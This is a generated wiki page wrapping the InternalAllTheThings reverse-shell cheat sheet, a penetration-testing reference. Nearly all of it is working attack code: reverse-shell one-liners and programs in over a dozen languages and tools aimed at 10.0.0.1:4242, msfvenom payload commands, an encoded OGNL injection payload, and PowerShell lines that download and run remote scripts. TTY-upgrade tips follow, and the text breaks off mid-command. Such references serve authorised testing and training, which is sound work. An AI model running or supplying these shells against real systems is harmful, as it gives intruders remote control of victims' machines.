---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Reverse Shell Cheat Sheet

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cheatsheets-shell-reverse-cheatsheet` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/shell-reverse-cheatsheet.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Reverse Shell Cheat Sheet](../../topics/cheatsheets/reverse-shell-cheat-sheet.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cheatsheets-shell-reverse-cheatsheet |
| name | Reverse Shell Cheat Sheet |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/shell-reverse-cheatsheet.md |

## Preserved Source Material

````yaml
_body: "# Reverse Shell Cheat Sheet\n\n## Summary\n\n* [Tools](#tools)\n* [Reverse Shell](#reverse-shell)\n    * [Awk](#awk)\n\
  \    * [Bash TCP](#bash-tcp)\n    * [Bash UDP](#bash-udp)\n    * [C](#c)\n    * [Dart](#dart)\n    * [Golang](#golang)\n\
  \    * [Groovy Alternative 1](#groovy-alternative-1)\n    * [Groovy](#groovy)\n    * [Java Alternative 1](#java-alternative-1)\n\
  \    * [Java Alternative 2](#java-alternative-2)\n    * [Java](#java)\n    * [Lua](#lua)\n    * [Ncat](#ncat)\n    * [Netcat\
  \ OpenBsd](#netcat-openbsd)\n    * [Netcat BusyBox](#netcat-busybox)\n    * [Netcat Traditional](#netcat-traditional)\n\
  \    * [NodeJS](#nodejs)\n    * [OGNL](#ognl)\n    * [OpenSSL](#openssl)\n    * [Perl](#perl)\n    * [PHP](#php)\n    *\
  \ [Powershell](#powershell)\n    * [Python](#python)\n    * [Ruby](#ruby)\n    * [Rust](#rust)\n    * [Socat](#socat)\n\
  \    * [Telnet](#telnet)\n    * [War](#war)\n* [Meterpreter Shell](#meterpreter-shell)\n    * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)\n\
  \    * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)\n    * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)\n\
  \    * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)\n    * [Other platforms](#other-platforms)\n* [Spawn\
  \ TTY Shell](#spawn-tty-shell)\n* [References](#references)\n\n## Tools\n\n* [reverse-shell-generator](https://www.revshells.com/)\
  \ - Hosted Reverse Shell generator ([source](https://github.com/0dayCTF/reverse-shell-generator)) ![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)\n\
  * [revshellgen](https://github.com/t0thkr1s/revshellgen) -  CLI Reverse Shell generator\n\n## Reverse Shell\n\n### Bash\
  \ TCP\n\n```bash\nbash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n\n0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196\n\
  \n/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1\n```\n\n### Bash UDP\n\n```bash\nVictim:\nsh -i >& /dev/udp/10.0.0.1/4242\
  \ 0>&1\n\nListener:\nnc -u -lvp 4242\n```\n\nDon't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh,\
  \ tcsh, bash\n\n### Socat\n\n```powershell\nuser@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242\nuser@victim$ /tmp/socat\
  \ exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n```\n\n```powershell\nuser@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat\
  \ -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n```\n\n\
  Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)\n\
  \n### Perl\n\n```perl\nperl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\
  >&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\nperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"\
  10.0.0.1:4242\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n\n\nNOTE: Windows only\nperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"\
  10.0.0.1:4242\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n```\n\n### Python\n\nLinux only\n\nIPv4\n\n```python\n\
  export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"\
  ),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\n```\n\n```python\npython\
  \ -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"\
  /bin/sh\")'\n```\n\n```python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"\
  ])'\n```\n\n```python\npython -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n```\n\nIPv4\
  \ (No Spaces)\n\n```python\npython -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n```\n\n```python\n\
  python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"\
  ])'\n```\n\n```python\npython -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\n```\n\nIPv4\
  \ (No Spaces, Shortened)\n\n```python\npython -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"\
  10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n```\n\n```python\npython -c 'a=__import__;b=a(\"\
  socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"\
  /bin/sh\",\"-i\"])'\n```\n\n```python\npython -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"\
  10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n```\n\nIPv4 (No Spaces, Shortened\
  \ Further)\n\n```python\npython -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"\
  10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'\n```\n\n```python\npython -c 'a=__import__;b=a(\"\
  socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"\
  /bin/sh\",\"-i\"])'\n```\n\n```python\npython -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"\
  10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'\n```\n\nIPv6\n\n```python\npython\
  \ -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"\
  /bin/sh\")'\n```\n\nIPv6 (No Spaces)\n\n```python\npython -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"\
  pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"\
  /bin/sh\")'\n```\n\nIPv6 (No Spaces, Shortened)\n\n```python\npython -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"\
  pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"\
  /bin/sh\")'\n```\n\nWindows only (Python2)\n\n```powershell\npython.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1',\
  \ 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None,\
  \ None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__':\
  \ lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and\
  \ [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None,\
  \ '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1]\
  \ for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for\
  \ s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p']\
  \ in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1]\
  \ for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s,\
  \ p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if\
  \ True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__\
  \ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']),\
  \ __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0]\
  \ if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os',\
  \ __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess',\
  \ __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda\
  \ y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"\n```\n\nWindows only (Python3)\n\n```powershell\npython.exe\
  \ -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\\\
  \"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\
  \"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\"\n```\n\n### PHP\n\n```bash\nphp -r '$sock=fsockopen(\"\
  10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i\
  \ <&3 >&3 2>&3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i <&3 >&3 2>&3`;'\nphp -r '$sock=fsockopen(\"\
  10.0.0.1\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i\
  \ <&3 >&3 2>&3\");'\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'\n```\n\n```bash\n\
  php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\n\
  ```\n\n### Ruby\n\n```ruby\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d\
  \ 2>&%d\",f,f,f)'\n\nruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"\
  exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\n\nNOTE:\
  \ Windows only\nruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print\
  \ io.read}end'\n```\n\n### Rust\n\n```rust\nuse std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse\
  \ std::process::{Command, Stdio};\n\nfn main() {\n    let s = TcpStream::connect(\"10.0.0.1:4242\").unwrap();\n    let fd\
  \ = s.as_raw_fd();\n    Command::new(\"/bin/sh\")\n        .arg(\"-i\")\n        .stdin(unsafe { Stdio::from_raw_fd(fd)\
  \ })\n        .stdout(unsafe { Stdio::from_raw_fd(fd) })\n        .stderr(unsafe { Stdio::from_raw_fd(fd) })\n        .spawn()\n\
  \        .unwrap()\n        .wait()\n        .unwrap();\n}\n```\n\n### Golang\n\n```bash\necho 'package main;import\"os/exec\"\
  ;import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'\
  \ > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n```\n\n### Netcat Traditional\n\n```bash\nnc -e /bin/sh 10.0.0.1 4242\n\
  nc -e /bin/bash 10.0.0.1 4242\nnc -c bash 10.0.0.1 4242\n```\n\n### Netcat OpenBsd\n\n```bash\nrm -f /tmp/f;mkfifo /tmp/f;cat\
  \ /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f\n```\n\n### Netcat BusyBox\n\n```bash\nrm -f /tmp/f;mknod /tmp/f p;cat\
  \ /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f\n```\n\n### Ncat\n\n```bash\nncat 10.0.0.1 4242 -e /bin/bash\nncat --udp\
  \ 10.0.0.1 4242 -e /bin/bash\n```\n\n### OpenSSL\n\nAttacker:\n\n```powershell\nuser@attack$ openssl req -x509 -newkey rsa:4096\
  \ -keyout key.pem -out cert.pem -days 365 -nodes\nuser@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port\
  \ 4242\nor\nuser@attack$ ncat --ssl -vv -l -p 4242\n\nuser@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client\
  \ -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s\n```\n\nTLS-PSK (does not rely on PKI or self-signed certificates)\n\
  \n```bash\n# generate 384-bit PSK\n# use the generated string as a value for the two PSK variables from below\nopenssl rand\
  \ -hex 48 \n# server (attacker)\nexport LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"\
  ; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256\
  \ -psk $PSK -nocert -accept $LHOST:$LPORT\n# client (victim)\nexport RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"\
  replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 |\
  \ openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE\n```\n\n### Powershell\n\n```powershell\n\
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream\
  \ = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data\
  \ = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2\
  \  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\
  ```\n\n```powershell\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream =\
  \ $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data =\
  \ (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2\
  \ = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\
  \n```\n\n```powershell\npowershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\n\
  ```\n\n### Awk\n\n```powershell\nawk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell>\" |& s;\
  \ s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n\
  ```\n\n### Java\n\n```java\nRuntime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat\
  \ <&5 | while read line; do $line 2>&5 >&5; done'\");\np.waitFor();\n\n```\n\n#### Java Alternative 1\n\n```java\nString\
  \ host=\"127.0.0.1\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket\
  \ s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try\
  \ {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n\n```\n\n#### Java Alternative 2\n\n**NOTE**: This\
  \ is more stealthy\n\n```java\nThread thread = new Thread(){\n    public void run(){\n        // Reverse shell here\n  \
  \  }\n}\nthread.start();\n```\n\n### Telnet\n\n```bash\nIn Attacker machine start two listeners:\nnc -lvp 8080\nnc -lvp\
  \ 8081\n\nIn Victime machine run below command:\ntelnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081\n```\n\n### War\n\
  \n```java\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war\nstrings reverse.war |\
  \ grep jsp # in order to get the name of the file\n```\n\n### Lua\n\nLinux only\n\n```powershell\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh\
  \ -i <&3 >&3 2>&3');\"\n```\n\nWindows and Linux\n\n```powershell\nlua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local\
  \ socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do\
  \ local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s)\
  \ if status == \"closed\" then break end end tcp:close()'\n```\n\n### NodeJS\n\n```javascript\n(function(){\n    var net\
  \ = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client\
  \ = new net.Socket();\n    client.connect(4242, \"10.0.0.1\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n\
  \        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application from crashing\n})();\n\n\n\
  or\n\nrequire('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')\n\nor\n\n-var x = global.process.mainModule.require\n\
  -x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')\n\nor\n\nhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py\n\
  ```\n\n### OGNL\n\n```java\n(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg== | base64 -d |\
  \ bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())\n```\n\nWith `YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==`\
  \ decoding to `bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'`, the payload within the single quotes might be changed\
  \ by any Linux-compatible reverse shell.\n\n### Groovy\n\nby [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)\n\
  NOTE: Java reverse shell also work for Groovy\n\n```java\nString host=\"10.0.0.1\";\nint port=4242;\nString cmd=\"cmd.exe\"\
  ;\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),\
  \ si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try\
  \ {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n```\n\n#### Groovy Alternative 1\n\n**NOTE**: This\
  \ is more stealthy\n\n```java\nThread.start {\n    // Reverse shell here\n}\n```\n\n### C\n\nCompile with `gcc /tmp/shell.c\
  \ --output csh && csh`\n\n```csharp\n#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\
  #include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = 4242;\n    struct\
  \ sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;  \
  \     \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\");\n\n    connect(sockt,\
  \ (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt,\
  \ 2);\n\n    char * const argv[] = {\"/bin/sh\", NULL};\n    execve(\"/bin/sh\", argv, NULL);\n\n    return 0;       \n\
  }\n```\n\n### Dart\n\n```java\nimport 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"10.0.0.1\", 4242).then((socket)\
  \ {\n    socket.listen((data) {\n      Process.start('powershell.exe', []).then((Process process) {\n        process.stdin.writeln(new\
  \ String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output)\
  \ { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}\n```\n\n\
  ## Meterpreter Shell\n\n### Windows Staged reverse TCP\n\n```powershell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1\
  \ LPORT=4242 -f exe > reverse.exe\n```\n\n### Windows Stageless reverse TCP\n\n```powershell\nmsfvenom -p windows/shell_reverse_tcp\
  \ LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe\n```\n\n### Linux Staged reverse TCP\n\n```powershell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp\
  \ LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf\n```\n\n### Linux Stageless reverse TCP\n\n```powershell\nmsfvenom -p linux/x86/shell_reverse_tcp\
  \ LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf\n```\n\n### Other platforms\n\n```powershell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp\
  \ LHOST=\"10.0.0.1\" LPORT=4242 -f elf > shell.elf\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242\
  \ -f exe > shell.exe\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho > shell.macho\nmsfvenom\
  \ -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp > shell.asp\nmsfvenom -p java/jsp_shell_reverse_tcp\
  \ LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.jsp\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242\
  \ -f war > shell.war\nmsfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.py\nmsfvenom -p cmd/unix/reverse_bash\
  \ LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.sh\nmsfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw\
  \ > shell.pl\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.php; cat shell.php |\
  \ pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php\n```\n\n## Spawn TTY Shell\n\nIn order to catch\
  \ a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with\
  \ `[CTRL] + [L]`.\n\n```powershell\nrlwrap nc 10.0.0.1 4242\n\nrlwrap -r -f . nc 10.0.0.1 4242\n-f . will make rlwrap use\
  \ the current history file as a completion word list.\n-r Put all words seen on in- and output on the completion list.\n\
  ```\n\nSometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.\n\n:warning: OhMyZSH\
  \ might break this trick, a simple `sh` is recommended\n\n> The main problem here is that zsh doesn't handle the stty command\
  \ the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon\
  \ as the prompt appear for you to execute the fg command, your -echo command already lost its effect\n\n```powershell\n\
  ctrl+z\necho $TERM && tput lines && tput cols\n\n# for bash\nstty raw -echo\nfg\n\n# for zsh\nstty raw -echo; fg\n\nreset\n\
  export SHELL=bash\nexport TERM=xterm-256color\nstty rows <num> columns <cols>\n```\n\n:warning: With Windows Terminal +\
  \ WSL container,  `[CTRL] + [Z]` can get you out of / freeze the container.\nTo overcome this issue, run `nc` in a `tmux`,\
  \ and send a `SIGTSTP` signal to the `nc` process.\n\n```bash\n# Enter in tmux\ntmux\n\n# Do your netcat stuff ...\nnc -lnvp\
  \ 4242\n\n# Create a new window in tmux\nctrl+b c\n\n# Find the PID of the nc process (column PID)\nps aux # | grep -i nc\
  \ | grep -vi grep\n\n# Send a SIGTSTP (ctrl+z) signal to the process\nkill -s TSTP <PID>\n```\n\nor use `socat` binary to\
  \ get a fully tty reverse shell\n\n```bash\nsocat file:`tty`,raw,echo=0 tcp-listen:12345\n```\n\nAlternatively, `rustcat`\
  \ binary can automatically inject the TTY shell command.\n\nThe shell will be automatically upgraded and the TTY size will\
  \ be provided for manual adjustment.\nNot only that, upon exiting the shell, the terminal will be reset and thus usable.\n\
  \n```bash\nstty raw -echo; stty size && rcat l -ie \"/usr/bin/script -qc /bin/bash /dev/null\" 6969 && reset\n```\n\nSpawn\
  \ a TTY shell from an interpreter\n\n```powershell\n/bin/sh -i\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3\
  \ -c \"__import__('pty').spawn('/bin/bash')\"\npython3 -c \"__import__('subprocess').call(['/bin/bash'])\"\nperl -e 'exec\
